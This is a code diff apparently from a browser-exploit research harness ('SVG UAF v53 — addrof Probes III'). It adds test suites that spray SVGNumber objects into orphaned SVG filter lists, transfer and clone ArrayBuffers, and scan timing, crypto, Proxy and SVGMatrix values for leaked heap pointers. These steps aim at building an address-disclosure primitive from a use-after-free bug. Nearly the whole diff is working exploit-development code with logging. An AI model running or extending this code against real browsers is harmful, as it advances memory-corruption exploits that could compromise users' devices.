+    L('ADR11: [T1] original detached after clone: '+(ab.byteLength===0)+' (should be false for non-transfer)');
+    // Spray SVGNumbers before and after clone, check residue
+    var svg=makeSVG();
+    var f=document.createElementNS(SVG_NS,'feColorMatrix');
+    f.setAttribute('type','matrix');f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
+    var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','ac11');
+    filt.appendChild(f);svg.appendChild(filt);
+    var bl=f.values.baseVal;bl.clear();
+    var refs=[];
+    for(var i=0;i<20;i++){var n=getTmp().createSVGNumber();n.value=0;bl.appendItem(n);refs.push(bl.getItem(bl.length-1));}
+    filt.parentNode.removeChild(filt);
+    // clone a large AB between the spray allocs and the orphan
+    var bigAB=new ArrayBuffer(1024*16);
+    var bigClone=structuredClone(bigAB);
+    var residue=0;
+    for(var i=0;i<refs.length;i++){if(refs[i].value!==0)residue++;}
+    L('ADR11: [T1] post-clone SVGNumber residue='+residue+(residue>0?' ★':'clean'));
+    removeSVG(svg);
+  }catch(ex){L('ADR11: [T1] structuredClone: '+ex.message,'warn');}
 
-  // Test 2: Function.prototype.caller (non-strict)
-  function innerFn(){
-    try{
-      var c=innerFn.caller;
-      L('ADR9: [T2] caller='+c);
-      return c;
-    }catch(ex){L('ADR9: [T2] .caller threw: '+ex.message);}
-  }
-  (function outerFn(){innerFn();})();
-
-  // Test 3: arguments.callee.caller chain
+  // Test 2: MessageChannel postMessage round-trip
+  L('ADR11: [T2] MessageChannel postMessage round-trip...');
   try{
-    (function nonStrict1(){
-      (function nonStrict2(){
-        try{
-          L('ADR9: [T3] callee.name='+arguments.callee.name);
-          var caller=arguments.callee.caller;
-          L('ADR9: [T3] callee.caller='+caller);
-          if(caller) L('ADR9: [T3] callee.caller.name='+caller.name);
-        }catch(ex){L('ADR9: [T3] chain: '+ex.message);}
-      })();
-    })();
-  }catch(ex){L('ADR9: [T3] outer: '+ex.message);}
-
-  // Test 4: Error.captureStackTrace (V8)
-  L('ADR9: [T4] Error.captureStackTrace='+typeof Error.captureStackTrace);
-  L('ADR9: [T4] Error.prepareStackTrace='+typeof Error.prepareStackTrace);
-
-  // Test 5: custom Error.prepareStackTrace to intercept stack frames
-  var origPrepare=Error.prepareStackTrace;
-  var frameData=null;
-  try{
-    Error.prepareStackTrace=function(err,frames){
-      frameData=frames;
-      return frames.map(function(f){return f.toString();}).join('\n');
-    };
-    var e=new Error('probe');
-    var s=e.stack; // triggers prepareStackTrace
-    if(frameData){
-      L('ADR9: [T5] prepareStackTrace fired! frames='+frameData.length);
-      for(var i=0;i<Math.min(frameData.length,3);i++){
-        var fr=frameData[i];
-        L('ADR9: [T5] frame['+i+']: '+fr);
-        // Try to get function object from frame
-        try{
-          var fn=fr.getFunction&&fr.getFunction();
-          if(fn) L('ADR9: [T5] frame['+i+'].getFunction()='+fn);
-        }catch(ex){}
-        try{
-          var fnName=fr.getFunctionName&&fr.getFunctionName();
-          L('ADR9: [T5] frame['+i+'].getFunctionName()='+fnName);
-        }catch(ex){}
-        try{
-          var pos=fr.getPosition&&fr.getPosition();
-          L('ADR9: [T5] frame['+i+'].getPosition()='+pos);
-        }catch(ex){}
+    var mc=new MessageChannel();
+    var received=false;
+    mc.port1.onmessage=function(ev){
+      received=true;
+      var data=ev.data;
+      L('ADR11: [T2] received: type='+typeof data+' keys='+Object.keys(data||{}).join(','));
+      if(data&&data.buf instanceof ArrayBuffer){
+        var rv=new Uint32Array(data.buf);
+        L('ADR11: [T2] AB canary: 0x'+rv[0].toString(16)+' byteLength='+data.buf.byteLength);
+        L('ADR11: [T2] transferred (original detached): '+(data.originalDetached===true));
       }
-    }else{
-      L('ADR9: [T5] prepareStackTrace NOT supported (JSC-specific, V8 only)');
-    }
-  }catch(ex){L('ADR9: [T5] prepareStackTrace: '+ex.message);}
-  finally{Error.prepareStackTrace=origPrepare;}
+      // check for any ptr-like values in received data
+      if(data&&typeof data.val==='number'){
+        L('ADR11: [T2] val='+data.val+' bits='+f64hex(data.val)+' ptr-like='+isPointerLike(data.val));
+      }
+    };
+    // Transfer ArrayBuffer (zero-copy move — exposes backing store)
+    var transferAB=new ArrayBuffer(256);
+    var tview=new Uint32Array(transferAB);
+    tview[0]=0xfeedface;
+    var origLen=transferAB.byteLength;
+    mc.port2.postMessage({buf:transferAB,originalDetached:(transferAB.byteLength===0),val:1/3},[transferAB]);
+    L('ADR11: [T2] sent, AB now detached: '+(transferAB.byteLength===0)+' origLen='+origLen);
+    setTimeout(function(){
+      if(!received) L('ADR11: [T2] no message received (cross-origin blocked?)','warn');
+    },500);
+  }catch(ex){L('ADR11: [T2] MessageChannel: '+ex.message,'warn');}
 
-  // Test 6: stack depth as timing oracle
-  // Deep recursion — does JSC expose depth anywhere?
-  var maxDepth=0;
+  // Test 3: JSON.parse heap placement
+  L('ADR11: [T3] JSON.parse heap placement probe...');
+  var jsonStr='['+Array.from({length:100},function(_,i){return i;}).join(',')+']';
+  var arr=JSON.parse(jsonStr);
+  L('ADR11: [T3] JSON.parse array: length='+arr.length+' [0]='+arr[0]+' [99]='+arr[99]);
+  // spray SVGNumbers after JSON.parse, check if any leaked into
+  var svg2=makeSVG();
+  var f2=document.createElementNS(SVG_NS,'feColorMatrix');
+  f2.setAttribute('type','matrix');f2.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
+  var filt2=document.createElementNS(SVG_NS,'filter');filt2.setAttribute('id','ac11b');
+  filt2.appendChild(f2);svg2.appendChild(filt2);
+  var bl2=f2.values.baseVal;bl2.clear();
+  var refs2=[];
+  for(var i=0;i<20;i++){var n2=getTmp().createSVGNumber();n2.value=0;bl2.appendItem(n2);refs2.push(bl2.getItem(bl2.length-1));}
+  filt2.parentNode.removeChild(filt2);
+  var residue2=0;
+  for(var i=0;i<refs2.length;i++){if(refs2[i].value!==0)residue2++;}
+  L('ADR11: [T3] JSON-adjacent SVGNumber residue='+residue2+(residue2>0?' ★':'clean'));
+  removeSVG(svg2);
+
+  // Test 4: ArrayBuffer.transfer() — moves backing store to new AB
+  L('ADR11: [T4] ArrayBuffer.transfer() probe...');
   try{
-    (function recurse(n){
-      maxDepth=n;
-      recurse(n+1);
-    })(0);
-  }catch(ex){
-    L('ADR9: [T6] stack overflow at depth='+maxDepth+' msg='+ex.message.slice(0,40));
+    var ab3=new ArrayBuffer(128);
+    var u8_3=new Uint8Array(ab3);
+    u8_3[0]=0xAB;u8_3[1]=0xCD;
+    if(typeof ab3.transfer==='function'){
+      var ab4=ab3.transfer(256); // resize + transfer
+      L('ADR11: [T4] transfer() available! new byteLength='+ab4.byteLength);
+      L('ADR11: [T4] old ab detached: '+(ab3.byteLength===0));
+      var u8_4=new Uint8Array(ab4);
+      L('ADR11: [T4] canary preserved: 0x'+u8_4[0].toString(16)+u8_4[1].toString(16));
+    }else{
+      L('ADR11: [T4] ArrayBuffer.transfer() not available');
+    }
+  }catch(ex){L('ADR11: [T4] transfer: '+ex.message);}
+
+  L('ADR11: done');
+}
+
+// ─────────────────────────────────────────────────────────────────
+// ADR12 — PerformanceObserver / PerformanceMark / crypto
+// performance.mark() stores timing info in C++ PerformanceMark objects
+// Any internal C++ pointer exposed through timing APIs?
+//
+// crypto.getRandomValues — is the output distinct from heap contents?
+// (Confirms RNG is seeded separately, not reading heap garbage)
+//
+// Also: MessageEvent.source, Event.target — any ptr-like fields?
+// Also: Proxy / Reflect internals
+// ─────────────────────────────────────────────────────────────────
+function runADR12(){
+  L('','suite-hdr');L('ADR12: Performance / crypto / Proxy / Event internals');
+
+  // Test 1: PerformanceMark — does mark.startTime carry internal ptr bits?
+  try{
+    performance.mark('probe_start');
+    // Do some allocation between marks
+    var dummy=new Array(1000).fill(0).map(function(_,i){return{v:i};});
+    performance.mark('probe_end');
+    var entries=performance.getEntriesByType('mark');
+    L('ADR12: [T1] mark entries: '+entries.length);
+    for(var i=0;i<entries.length;i++){
+      var e=entries[i];
+      L('ADR12: [T1] mark['+i+']: name='+e.name+' startTime='+e.startTime+' bits='+f64hex(e.startTime));
+      if(isPointerLike(e.startTime)) L('ADR12: ★ startTime PTR-LIKE!','hit');
+    }
+    // measure
+    try{
+      performance.measure('probe_dur','probe_start','probe_end');
+      var measures=performance.getEntriesByType('measure');
+      L('ADR12: [T1] measure duration='+measures[0].duration+' bits='+f64hex(measures[0].duration));
+    }catch(ex){L('ADR12: [T1] measure: '+ex.message);}
+  }catch(ex){L('ADR12: [T1] performance.mark: '+ex.message,'warn');}
+
+  // Test 2: PerformanceObserver
+  L('ADR12: [T2] PerformanceObserver='+typeof PerformanceObserver);
+  if(typeof PerformanceObserver!=='undefined'){
+    try{
+      var obs=new PerformanceObserver(function(list){
+        var entries=list.getEntries();
+        for(var i=0;i<entries.length;i++){
+          var e=entries[i];
+          L('ADR12: [T2] observer entry: name='+e.name+' startTime='+e.startTime.toFixed(6)+' bits='+f64hex(e.startTime));
+          if(isPointerLike(e.startTime)) L('ADR12: ★ observer startTime PTR-LIKE!','hit');
+        }
+      });
+      obs.observe({entryTypes:['mark','measure','longtask']});
+      performance.mark('obs_test');
+      obs.disconnect();
+    }catch(ex){L('ADR12: [T2] observer: '+ex.message);}
   }
 
-  // Test 7: Named capture group in RegExp — any address in match object?
+  // Test 3: crypto.getRandomValues — is it seeded with heap garbage?
+  // (If the first few bytes look like valid JS floats, suspect memory seeding)
   try{
-    var re=/(?<x>a+)/;
-    var m=re.exec('aaaa');
-    if(m&&m.groups){
-      L('ADR9: [T7] named groups: x='+m.groups.x);
-      L('ADR9: [T7] groups obj constructor='+m.groups.constructor);
+    var rnd=new Uint32Array(8);
+    crypto.getRandomValues(rnd);
+    L('ADR12: [T3] crypto.getRandomValues:');
+    for(var i=0;i<8;i++) L('ADR12: [T3] rnd['+i+']=0x'+rnd[i].toString(16).padStart(8,'0'));
+    // Check if any 64-bit pair looks like a valid arm64 heap pointer
+    var dv2=new DataView(rnd.buffer);
+    for(var i=0;i<4;i++){
+      var f=dv2.getFloat64(i*8,true);
+      if(isPointerLike(f)) L('ADR12: ★ rnd f64['+i+']='+f+' PTR-LIKE (unlikely for true RNG)','hit');
     }
-  }catch(ex){L('ADR9: [T7] regex: '+ex.message);}
+  }catch(ex){L('ADR12: [T3] crypto: '+ex.message,'warn');}
 
-  // Test 8: globalThis / window object — any internal address exposed?
+  // Test 4: Proxy get trap — does handler receive ptr-like values?
   try{
-    L('ADR9: [T8] typeof globalThis='+typeof globalThis);
-    var gt=globalThis;
-    // Does globalThis have any weird non-standard properties that look like ptrs?
-    var gtKeys=Object.getOwnPropertyNames(gt).filter(function(k){return k.startsWith('_')||k.startsWith('$');});
-    L('ADR9: [T8] globalThis unusual keys: '+gtKeys.slice(0,10).join(', ')||'none');
-  }catch(ex){L('ADR9: [T8]: '+ex.message);}
+    var ptrTarget={};
+    var intercepted=[];
+    var proxy=new Proxy(ptrTarget,{
+      get:function(target,prop,receiver){
+        // receiver is the proxy itself — does it carry address info?
+        intercepted.push({prop:prop,receiverType:typeof receiver});
+        return target[prop];
+      }
+    });
+    proxy.testProp; // trigger get
+    L('ADR12: [T4] Proxy get trap fired: prop='+intercepted[0].prop+' receiverType='+intercepted[0].receiverType);
+    L('ADR12: [T4] Reflect.ownKeys(proxy)='+JSON.stringify(Reflect.ownKeys(proxy)));
+  }catch(ex){L('ADR12: [T4] Proxy: '+ex.message);}
 
-  L('ADR9: done');
+  // Test 5: Event.target internal address probe
+  // Create a DOM event, check if event.target has any unusual properties
+  try{
+    var div=document.createElement('div');
+    var evt_ptr=null;
+    div.addEventListener('click',function(ev){
+      evt_ptr=ev;
+    });
+    div.dispatchEvent(new MouseEvent('click'));
+    if(evt_ptr){
+      L('ADR12: [T5] Event received: type='+evt_ptr.type);
+      // timeStamp — same as performance timing, check bits
+      L('ADR12: [T5] timeStamp='+evt_ptr.timeStamp.toFixed(6)+' bits='+f64hex(evt_ptr.timeStamp));
+      if(isPointerLike(evt_ptr.timeStamp)) L('ADR12: ★ timeStamp PTR-LIKE!','hit');
+    }
+  }catch(ex){L('ADR12: [T5] Event: '+ex.message);}
+
+  // Test 6: SVGMatrix via Proxy — intercept property access, see raw values
+  try{
+    var rawM=getOrphanedMatrix();
+    rawM.a=0x1b0001234;rawM.b=0xcafe0000;rawM.c=0;rawM.d=0x1b0001234;rawM.e=0;rawM.f=0;
+    var proxyM=new Proxy(rawM,{
+      get:function(target,prop){
+        var v=target[prop];
+        if(typeof v==='number') L('ADR12: [T6] proxy get '+String(prop)+'='+v+' bits='+f64hex(v)+(isPointerLike(v)?' ★PTR':''));
+        return v;
+      }
+    });
+    var a=proxyM.a;
+    var inv=rawM.inverse();
+    L('ADR12: [T6] inverse().a='+inv.a+' exact='+(inv.a===0x1b0001234));
+  }catch(ex){L('ADR12: [T6] Proxy matrix: '+ex.message);}
+
+  L('ADR12: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
 // RUN ALL
 // ─────────────────────────────────────────────────────────────────
-var suites={ADR6:runADR6,ADR7:runADR7,ADR8:runADR8,ADR9:runADR9};
+var suites={ADR7b:runADR7b,ADR10:runADR10,ADR11:runADR11,ADR12:runADR12};
 
 function runSuite(name){
   L('=== '+name+' ===','suite-hdr');
-  try{suites[name]();}catch(ex){L(name+' UNCAUGHT: '+ex.message+'\n'+ex.stack,'miss');}
+  try{suites[name]();}catch(ex){L(name+' UNCAUGHT: '+ex.message+'\n'+(ex.stack||''),'miss');}
   L('=== '+name+' done ===','info');
 }
 
 function runAll(){
   clearOut();
-  L('SVG UAF v52 — addrof Probes II','suite-hdr');
+  L('SVG UAF v53 — addrof Probes III','suite-hdr');
   L('----------------------------------------------------');
   var names=Object.keys(suites);
   var i=0;
   function next(){
     if(i>=names.length){L('','suite-hdr');L('ALL SUITES COMPLETE');return;}
     runSuite(names[i++]);
-    setTimeout(next,80);
+    setTimeout(next,100);
   }
   next();
 }
